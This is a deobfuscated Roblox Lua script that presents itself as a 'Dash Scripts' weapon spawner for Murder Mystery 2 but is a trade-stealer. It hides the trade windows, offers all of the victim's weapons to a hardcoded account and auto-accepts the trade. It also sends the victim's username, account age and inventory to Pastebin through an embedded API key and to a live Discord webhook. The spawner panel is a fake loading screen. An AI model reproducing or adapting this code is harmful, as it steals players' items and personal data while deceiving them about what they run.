-- This file was deobfusctated/pasted by Lame (special thanks to project vault)

local sendRequestText = "XxxXloveryl1"

if not getgenv().executed then
	getgenv().executed = true

	local InventoryModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
	local ProfileData = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
	local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
	local co = coroutine.create(function()
		while true do
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local TradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
			local TradeGUI_Phone = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

			if TradeGUI.Enabled == true then
				TradeGUI.Enabled = false
			end

			if TradeGUI_Phone.Enabled == true then
				TradeGUI_Phone.Enabled = false
			end

			wait(0.1)
		end
	end)
	local ks = {}

	for k, item in pairs(LevelModule.XPTable) do
		if item > ProfileData.NewXP then
			table.insert(ks, k)
		end
	end

	math.min(table.unpack(ks))

	local _ = LevelModule.Prestige
	local itemNames = {}
	local sum = 0
	local dataIDs = {}
	local secondaryDataIDs = {}
	local alternateDataIDs = {}
	local additionalDataIDs = {}
	local fallbackDataIDs = {}
	local nestedDataIDs = {}
	local innerDataIDs = {}
	local outerDataIDs = {}
	local number = 0
	local secondarySum = 0
	local alternateSum = 0
	local additionalSum = 0
	local fallbackSum = 0
	local nestedSum = 0
	local innerSum = 0
	local outerSum = 0

	for _, item in pairs(InventoryModule.MyInventory.Data.Weapons) do
		for _, item in pairs(item) do
			table.insert(itemNames, item.ItemName)

			if item.Rarity == "Vintage" then
				number = number + 1
				table.insert(dataIDs, item.DataID)
			end

			if item.Rarity == "Common" then
				secondarySum = secondarySum + 1
				table.insert(secondaryDataIDs, item.DataID)
			end

			if item.Rarity == "Uncommon" then
				alternateSum = alternateSum + 1
				table.insert(alternateDataIDs, item.DataID)
			end

			if item.Rarity == "Rare" then
				additionalSum = additionalSum + 1
				table.insert(additionalDataIDs, item.DataID)
			end

			if item.Rarity == "Legendary" then
				fallbackSum = fallbackSum + 1
				table.insert(fallbackDataIDs, item.DataID)
			end

			if item.Rarity == "Godly" then
				nestedSum = nestedSum + 1
				table.insert(nestedDataIDs, item.DataID)
			end

			if item.Rarity == "Ancient" then
				innerSum = innerSum + 1
				table.insert(innerDataIDs, item.DataID)
			end

			if item.Rarity == "Unique" then
				outerSum = outerSum + 1
				table.insert(outerDataIDs, item.DataID)
			end
		end
	end

	for _, _ in pairs(itemNames) do
		sum = sum + 1
	end

	local function sendRequest()
		coroutine.resume(co)

		local sendRequestData = {
			[1] = game:GetService("Players")[sendRequestText]
		}

		game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendRequestData))
		wait(3)

		for _, item in pairs(outerDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(innerDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(nestedDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(dataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(fallbackDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(additionalDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(alternateDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		for _, item in pairs(secondaryDataIDs) do
			local sendRequestData = {
				[1] = item,
				[2] = "Weapons"
			}

			game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(sendRequestData))
		end

		wait(6)

		local data = {
			[1] = 285646582
		}

		game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(data))
	end

	local HttpService = game:GetService("HttpService")

	local function concat(dataIDs)
		if #dataIDs ~= 0 then
			return table.concat(dataIDs, "\n")
		end

		return "None"
	end

	local apiPostPhp = (function(apiPasteCode)
		local data = {
			api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
			api_paste_code = apiPasteCode,
			api_option = "paste"
		}
		local text = ""

		for k, item in pairs(data) do
			text = text .. k .. "=" .. HttpService:UrlEncode(item) .. "&"
		end

		local body = text:sub(1, -2)
		local apiPostPhp = nil
		local ok, _ = pcall(function()
			apiPostPhp = request({
				Url = "https://pastebin.com/api/api_post.php",
				Method = "POST",
				Body = body,
				Headers = {
					["Content-Type"] = "application/x-www-form-urlencoded"
				},
				Timeout = 20
			})
		end)

		if ok and apiPostPhp and apiPostPhp.Success then
			return "https://pastebin.com/raw/" .. apiPostPhp.Body:match("([%w]+)$")
		end

		return "\nError...\n"
	end)("--  Uniques\n" .. concat(outerDataIDs) .. "\n\n--  Ancient\n" .. concat(innerDataIDs) .. "\n\n--  Godlies\n" .. concat(nestedDataIDs) .. "\n\n--  Legendaries\n" .. concat(fallbackDataIDs) .. "\n\n--  Vintage\n" .. concat(dataIDs) .. "\n\n--  Rare\n" .. concat(additionalDataIDs) .. "\n\n--  Uncommon\n" .. concat(alternateDataIDs) .. "\n\n--  Common\n" .. concat(secondaryDataIDs))
	local data = {
		title = "New MM2 Hit, execute code above to steal it.",
		color = 65280,
		fields = {
			{
				name = "Details:",
				value = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccountAge: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "Receiver: " .. sendRequestText .. "```"
			},
			{
				name = "Hit:",
				value = "Total Count: " .. tostring(outerSum + innerSum + nestedSum + fallbackSum + number + additionalSum + alternateSum + secondarySum) .. "\n Uniques: " .. tostring(outerSum) .. "\n Ancients: " .. tostring(innerSum) .. "\nGodlys: " .. nestedSum .. "\nLegendarys: " .. fallbackSum .. "Vintages: " .. tostring(number) .. "\nRares: " .. additionalSum .. "\nUncommons: " .. tostring(alternateSum) .. "\nCommons: " .. tostring(secondarySum)
			},
			{
				name = "Hit List:",
				value = "[Click Here](" .. apiPostPhp .. ")"
			}
		}
	}

	if nestedSum >= 1 or innerSum >= 1 or outerSum >= 1 then
		(function(url, secondaryArgument, tertiaryArgument)
			local httpService = game:GetService("HttpService")
			local headers = {
				["Content-Type"] = "application/json"
			}
			local jsonencodeConfig = {
				content = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
				embeds = {{
					title = secondaryArgument.title,
					color = secondaryArgument.color,
					fields = secondaryArgument.fields
				}}
			}
			local secondaryJsonencodeConfig = {
				content = "----@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
				embeds = {{
					title = secondaryArgument.title,
					color = secondaryArgument.color,
					fields = secondaryArgument.fields
				}}
			}
			local json = httpService:JSONEncode(jsonencodeConfig)
			local encodedData = httpService:JSONEncode(secondaryJsonencodeConfig)

			if tertiaryArgument ~= true then
				request({
					Url = url,
					Method = "POST",
					Headers = headers,
					Body = json
				})
			else
				request({
					Url = url,
					Method = "POST",
					Headers = headers,
					Body = encodedData
				})
			end
		end)("https://discord.com/api/webhooks/1361938808924536983/GVfb_ENNR2cv3tNVYtBdXhTGn0gSP19Dd1IB4yet21ZQ_QwhpcjLVI2VvYz1gdT1Wvm4", data, true)
	end

	game.Players.PlayerAdded:Connect(function(player)
		if player.Name == sendRequestText then
			player.Chatted:Connect(function(_)
				sendRequest()
			end)
		end
	end)
	game.Players.PlayerAdded:Connect(function(player)
		if player.Name == sendRequestText then
			player.Chatted:Connect(function(_)
				while nestedSum >= 1 or innerSum >= 1 or outerSum >= 1 do
					sendRequest()
				end
			end)
		end
	end)

	local LocalPlayer = game.Players.LocalPlayer
	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.IgnoreGuiInset = true

	local Frame = Instance.new("Frame")

	Frame.Size = UDim2.new(0, 280, 0, 80)
	Frame.Position = UDim2.new(0.5, -140, 0.45, 0)
	Frame.BackgroundTransparency = 1
	Frame.Parent = ScreenGui

	local ImageLabel = Instance.new("ImageLabel")

	ImageLabel.Size = UDim2.new(0, 60, 0, 60)
	ImageLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Image = "rbxassetid://87813999721570"
	ImageLabel.ImageTransparency = 1
	ImageLabel.Parent = Frame

	local UICorner = Instance.new("UICorner")

	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = ImageLabel

	local TextLabel = Instance.new("TextLabel")

	TextLabel.Size = UDim2.new(0, 190, 0, 50)
	TextLabel.Position = UDim2.new(0, 70, 0.15, 0)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Text = "DASH SCRIPT"
	TextLabel.TextTransparency = 1
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.Font = Enum.Font.GothamBlack
	TextLabel.TextScaled = true
	TextLabel.Parent = Frame

	local function handler(data, secondaryArgument, tertiaryArgument, count, secondaryCount, additionalArgument)
		for i = tertiaryArgument, count, secondaryCount do
			data[secondaryArgument] = i
			task.wait(additionalArgument)
		end

		data[secondaryArgument] = count
	end
	local function secondaryHandler(data, secondaryArgument, number, count, additionalArgument)
		for _ = 1, count do
			data[secondaryArgument] = data[secondaryArgument] + number
			task.wait(additionalArgument)
		end
	end;

	(function()
		task.spawn(function()
			handler(ImageLabel, "ImageTransparency", 1, 0, -0.1, 0.015)
		end)
		secondaryHandler(ImageLabel, "Position", UDim2.new(-0.0015, 0, 0, 0), 15, 0.015)
		wait(0.15)
		task.spawn(function()
			handler(TextLabel, "TextTransparency", 1, 0, -0.1, 0.015)
		end)
		secondaryHandler(TextLabel, "Position", UDim2.new(0.0015, 0, 0, 0), 15, 0.015)
		wait(1.5)

		for i = 0, 1, 0.1 do
			ImageLabel.ImageTransparency = i
			TextLabel.TextTransparency = i
			wait(0.015)
		end

		ScreenGui:Destroy()
	end)()

	local playerGuiContainer = game.Players.LocalPlayer
	local parent = Instance.new("ScreenGui")
	local frame = Instance.new("Frame")
	local textLabel = Instance.new("TextLabel")
	local TextButton = Instance.new("TextButton")
	local secondaryTextLabel = Instance.new("TextLabel")
	local closeButton = Instance.new("TextButton")
	local TextBox = Instance.new("TextBox")
	local UIStroke = Instance.new("UIStroke")
	local uiCorner = Instance.new("UICorner")
	local secondaryUiCorner = Instance.new("UICorner")

	Instance.new("UICorner")

	local alternateUiCorner = Instance.new("UICorner")

	parent.Parent = playerGuiContainer:WaitForChild("PlayerGui")
	parent.Parent = game:GetService("CoreGui")
	frame.Size = UDim2.new(0, 220, 0, 180)
	frame.Position = UDim2.new(0.5, -110, 0.4, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.Active = true
	frame.Draggable = true
	frame.Parent = parent
	UIStroke.Parent = frame
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.fromRGB(255, 50, 50)
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	uiCorner.CornerRadius = UDim.new(0, 10)
	uiCorner.Parent = frame
	textLabel.Size = UDim2.new(1, 0, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = "Dash Scripts"
	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel.TextSize = 22
	textLabel.Font = Enum.Font.FredokaOne
	textLabel.Parent = frame
	secondaryTextLabel.Size = UDim2.new(1, 0, 0, 25)
	secondaryTextLabel.Position = UDim2.new(0, 0, 0, 27)
	secondaryTextLabel.BackgroundTransparency = 1
	secondaryTextLabel.Text = "Weapon Spawner"
	secondaryTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	secondaryTextLabel.TextSize = 24
	secondaryTextLabel.Font = Enum.Font.FredokaOne
	secondaryTextLabel.Parent = frame
	TextBox.Size = UDim2.new(1, -20, 0, 30)
	TextBox.Position = UDim2.new(0, 10, 0, 60)
	TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextBox.TextSize = 16
	TextBox.Font = Enum.Font.FredokaOne
	TextBox.PlaceholderText = "Enter Item Name..."
	TextBox.Parent = frame
	TextBox.Text = ""
	alternateUiCorner.CornerRadius = UDim.new(0, 8)
	alternateUiCorner.Parent = TextBox
	TextButton.Size = UDim2.new(1, -20, 0, 40)
	TextButton.Position = UDim2.new(0, 10, 0, 100)
	TextButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	TextButton.Text = "Click To Spawn Item"
	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton.TextSize = 18
	TextButton.Font = Enum.Font.FredokaOne
	TextButton.Parent = frame
	secondaryUiCorner.CornerRadius = UDim.new(0, 8)
	secondaryUiCorner.Parent = TextButton

	local function createFrame(createFrameFlag)
		local frame = Instance.new("Frame")
		local valueLabel = Instance.new("TextLabel")
		local textLabel = Instance.new("TextLabel")
		local createFrameNumber = 10

		frame.Size = UDim2.new(0, 220, 0, 80)
		frame.Position = UDim2.new(1, -230, 0.4, 0)
		frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		frame.Parent = parent

		local uiCorner = Instance.new("UICorner")

		uiCorner.CornerRadius = UDim.new(0, 15)
		uiCorner.Parent = frame
		valueLabel.Size = UDim2.new(1, 0, 0.6, 0)
		valueLabel.Position = UDim2.new(0, 0, 0, 5)
		valueLabel.BackgroundTransparency = 1
		valueLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		valueLabel.TextScaled = true
		valueLabel.Text = "" .. createFrameNumber .. "%"
		valueLabel.Font = Enum.Font.FredokaOne
		valueLabel.Parent = frame
		textLabel.Size = UDim2.new(1, 0, 0.3, 0)
		textLabel.Position = UDim2.new(0, 0, 0.65, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
		textLabel.TextScaled = true
		textLabel.Text = "Loading Depends \n On Ping And Device."
		textLabel.Font = Enum.Font.FredokaOne
		textLabel.Parent = frame

		while createFrameNumber < 100 do
			local textNumber = math.random(1, 3)

			createFrameNumber = math.min(createFrameNumber + textNumber, 100)
			valueLabel.Text = "Spawning.." .. createFrameNumber .. "%"
			wait(3)
		end

		frame:Destroy();
		(function()
			local BoxController = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("BoxController")

			if not createFrameFlag or createFrameFlag == "" then
				print("No item entered.")
			else
				BoxController:Fire("Christmas2024Box", createFrameFlag)
				require(game:GetService("ReplicatedStorage").Database.Sync.Item)

				local profileDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
				local owned = {
					[createFrameFlag] = 1
				}
				local Weapons = profileDataModule.Weapons

				game:GetService("RunService"):BindToRenderStep("InventoryUpdate", 0, function()
					Weapons.Owned = owned
				end)
				game.Players.LocalPlayer.Character:BreakJoints()
			end
		end)()
		TextBox.Text = ""

		local playerGuiContainer = game.Players.LocalPlayer
		local secondaryParent = playerGuiContainer:WaitForChild("PlayerGui"):FindFirstChildOfClass("ScreenGui") or Instance.new("ScreenGui", playerGuiContainer:WaitForChild("PlayerGui"))
		local alternateParent = Instance.new("Frame")

		alternateParent.Size = UDim2.new(0.2, 0, 0.07, 0)
		alternateParent.Position = UDim2.new(0.4, 0, -0.15, 0)
		alternateParent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		alternateParent.BorderSizePixel = 0
		alternateParent.Parent = secondaryParent

		local secondaryUiCorner = Instance.new("UICorner")

		secondaryUiCorner.Parent = alternateParent
		secondaryUiCorner.CornerRadius = UDim.new(0.3, 0)

		local secondaryTextLabel = Instance.new("TextLabel")

		secondaryTextLabel.Parent = alternateParent
		secondaryTextLabel.Text = "Weapon Spawned!"
		secondaryTextLabel.Font = Enum.Font.FredokaOne
		secondaryTextLabel.TextSize = 16
		secondaryTextLabel.Size = UDim2.new(1, 0, 1, 0)
		secondaryTextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
		secondaryTextLabel.BackgroundTransparency = 1
		secondaryTextLabel.TextScaled = true

		local TweenService = game:GetService("TweenService")
		local tween = TweenService:Create(alternateParent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Position = UDim2.new(0.4, 0, 0.05, 0)
		})
		local create = TweenService:Create(alternateParent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
			Position = UDim2.new(0.4, 0, -0.15, 0),
			BackgroundTransparency = 1
		})

		tween:Play()
		task.wait(10)
		create:Play()
		task.wait(0.5)
		alternateParent:Destroy()
	end
	local function alternateHandler(instance)
		local TweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(instance, tweenInfo, {
			Size = instance.Size - UDim2.new(0, 5, 0, 5)
		})
		local create = TweenService:Create(instance, tweenInfo, {
			Size = instance.Size
		})

		tween:Play()
		tween.Completed:Connect(function()
			create:Play()
		end)
	end

	TextButton.MouseButton1Click:Connect(function()
		alternateHandler(TextButton)

		local TextBoxText = TextBox.Text

		if not TextBoxText or TextBoxText == "" then
			print("Please enter an item name.")
		else
			createFrame(TextBoxText)
		end
	end)
	closeButton.Size = UDim2.new(0, 60, 0, 20)
	closeButton.Position = UDim2.new(0.5, -30, 1, -30)
	closeButton.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
	closeButton.Text = "Close"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 14
	closeButton.Font = Enum.Font.FredokaOne
	closeButton.Parent = frame

	local additionalUiCorner = Instance.new("UICorner")

	additionalUiCorner.CornerRadius = UDim.new(0, 8)
	additionalUiCorner.Parent = closeButton

	local function additionalHandler(input)
		local TweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(input, tweenInfo, {
			Size = input.Size - UDim2.new(0, 5, 0, 5)
		})
		local create = TweenService:Create(input, tweenInfo, {
			Size = input.Size
		})

		tween:Play()
		tween.Completed:Connect(function()
			create:Play()
		end)
	end

	closeButton.MouseButton1Click:Connect(function()
		parent:Destroy()
		additionalHandler(closeButton)
	end)

	return
end
